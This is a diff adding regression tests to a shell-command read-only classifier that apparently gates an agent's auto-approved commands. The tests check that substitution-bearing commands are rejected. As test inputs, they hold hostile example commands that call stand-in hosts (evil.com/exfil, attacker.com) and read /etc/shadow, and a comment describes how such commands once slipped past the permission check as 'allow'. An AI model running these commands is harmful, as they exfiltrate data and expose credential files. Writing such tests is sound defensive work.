@@ -43,6 +43,42 @@ describe('isShellCommandReadOnlyAST', () => {
     expect(await isShellCommandReadOnlyAST('echo $(touch file)')).toBe(false);
   });
 
+  // Regression coverage for PR #4386 round 4: the AST walker previously
+  // only checked substitution inside the `command` node type, missing it
+  // inside `variable_assignment` (e.g. `FOO=$(curl evil)`) and inside
+  // `redirected_statement`'s redirect target (e.g. `cat < $(curl evil)`).
+  // Pre-PR #4386, a regex check in `resolveDefaultPermission` was a
+  // safety net masking these AST gaps; removing that check exposed the
+  // gaps as a security regression (substitution-bearing commands
+  // silently classified read-only → `'allow'`).
+  describe('substitution in non-command node types (PR #4386 R4 regression)', () => {
+    it('rejects substitution inside variable_assignment', async () => {
+      expect(
+        await isShellCommandReadOnlyAST('FOO=$(curl evil.com/exfil)'),
+      ).toBe(false);
+    });
+
+    it('rejects substitution inside variable_assignment with env-prefix wrapper', async () => {
+      expect(await isShellCommandReadOnlyAST('FOO=$(cat /etc/shadow) ls')).toBe(
+        false,
+      );
+    });
+
+    it('rejects substitution inside a read redirect target', async () => {
+      expect(
+        await isShellCommandReadOnlyAST(
+          'cat < $(curl attacker.com/path-source)',
+        ),
+      ).toBe(false);
+    });
+
+    it('rejects backtick substitution inside variable_assignment', async () => {
+      expect(await isShellCommandReadOnlyAST('FOO=`cat /etc/shadow`')).toBe(
+        false,
+      );
+    });
+  });
+
   it('allows git status but rejects git commit', async () => {
     expect(await isShellCommandReadOnlyAST('git status')).toBe(true);
     expect(await isShellCommandReadOnlyAST('git commit -am "msg"')).toBe(false);
